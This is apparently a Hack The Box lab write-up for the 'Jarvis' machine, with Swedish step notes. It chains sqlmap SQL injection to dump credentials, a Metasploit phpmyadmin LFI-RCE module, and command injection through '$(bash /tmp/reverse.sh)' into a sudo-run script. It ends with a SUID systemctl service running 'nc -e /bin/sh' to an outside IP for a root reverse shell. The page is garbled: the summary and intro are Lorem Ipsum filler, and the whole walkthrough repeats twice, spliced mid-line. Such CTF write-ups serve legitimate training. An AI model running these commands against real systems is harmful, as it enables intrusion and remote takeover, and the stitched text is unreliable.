---
layout: single
title: Jarvis - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-06-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-jarvis/jarvis_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-jarvis/jarvis_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


### USER ###

1. Basic enum (nmap -Pn -n -sC -sV -O 10.10.10.143 & dirb http://10.10.10.143)

2. Klicka runt p� sidan och se att /room.php?cod=2 kan uts�ttas f�r sql-injection genom att s�tta ' i slutet av uri

3. Execute SQL-injection med sqlmap f�r att f� fram user/pw:
sqlmap -u http://10.10.10.143/room.php?cod=2 --current-user --current-db --passwords --tamper=space2comment --random-agent --users --method=GET 

4. Logga in med crackade creds (DB*****:im******) p� http://10.10.10.143/phpmyadmin/

5. Metasploit har en lfi-rce f�r phpmyadmin (multi/http/phpmyadmin_lfi_rce) k�r den f�r meterpreter-shell

6. lse.sh visar att simpler.py k�rs som sudo

7. pspy64 visar att simpler.py k�rs
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

8. Ladda upp bash reverse shell och k�r scriptet sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
   Skriv in: "$(bash /tmp/reverse.sh)" utan "" f�r att f� user shell

9. cat /home/pepper/user.txt

### ROOT ###

1. Fixa SSH-access med pub-key
   local host: ssh-keygen
   remote host: mkdir ~/.ssh/
   remote host: vi ~/.ssh/authorized_keys  klistra in inneh�ll fr�n pub-key (/root/.ssh/id_rsa.pub)
   remote host: s�tt permission 700 p� .ssh och 644 p� authorized_keys samt att filen �gs av pepper
   local host: ssh pepper@10.10.10.143

2. lse -l1 visar att /bin/systemctl har suid
   Exploit info om bins med SUID: https://gtfobins.github.io/gtfobins/

3. Skapa en egen service via systemctl som skapar ett reverse root shell (gl�m inte starta nc innan):
    pepper@jarvis:/bin$ TF=$(mktemp).service
    pepper@jarvis:/bin$ echo '[Service]
    > Type=oneshot
    > ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.14.5 4488"
    > [Install]
    > WantedBy=multi-user.target' > $TF
    pepper@jarvis:/bin$ ./systemctl link $TF
    pepper@jarvis:/bin$ ./systemctl enable --now $TF

4. cat /root/root.txt### USER ###

1. Basic enum (nmap -Pn -n -sC -sV -O 10.10.10.143 & dirb http://10.10.10.143)

2. Klicka runt p� sidan och se att /room.php?cod=2 kan uts�ttas f�r sql-injection genom att s�tta ' i slutet av uri

3. Execute SQL-injection med sqlmap f�r att f� fram user/pw:
sqlmap -u http://10.10.10.143/room.php?cod=2 --current-user --current-db --passwords --tamper=space2comment --random-agent --users --method=GET 

4. Logga in med crackade creds (DB*****:im******) p� http://10.10.10.143/phpmyadmin/

5. Metasploit har en lfi-rce f�r phpmyadmin (multi/http/phpmyadmin_lfi_rce) k�r den f�r meterpreter-shell

6. lse.sh visar att simpler.py k�rs som sudo

7. pspy64 visar att simpler.py k�rs
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

8. Ladda upp bash reverse shell och k�r scriptet sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
   Skriv in: "$(bash /tmp/reverse.sh)" utan "" f�r att f� user shell

9. cat /home/pepper/user.txt

### ROOT ###

1. Fixa SSH-access med pub-key
   local host: ssh-keygen
   remote host: mkdir ~/.ssh/
   remote host: vi ~/.ssh/authorized_keys  klistra in inneh�ll fr�n pub-key (/root/.ssh/id_rsa.pub)
   remote host: s�tt permission 700 p� .ssh och 644 p� authorized_keys samt att filen �gs av pepper
   local host: ssh pepper@10.10.10.143

2. lse -l1 visar att /bin/systemctl har suid
   Exploit info om bins med SUID: https://gtfobins.github.io/gtfobins/

3. Skapa en egen service via systemctl som skapar ett reverse root shell (gl�m inte starta nc innan):
    pepper@jarvis:/bin$ TF=$(mktemp).service
    pepper@jarvis:/bin$ echo '[Service]
    > Type=oneshot
    > ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.14.5 4488"
    > [Install]
    > WantedBy=multi-user.target' > $TF
    pepper@jarvis:/bin$ ./systemctl link $TF
    pepper@jarvis:/bin$ ./systemctl enable --now $TF

4. cat /root/root.txt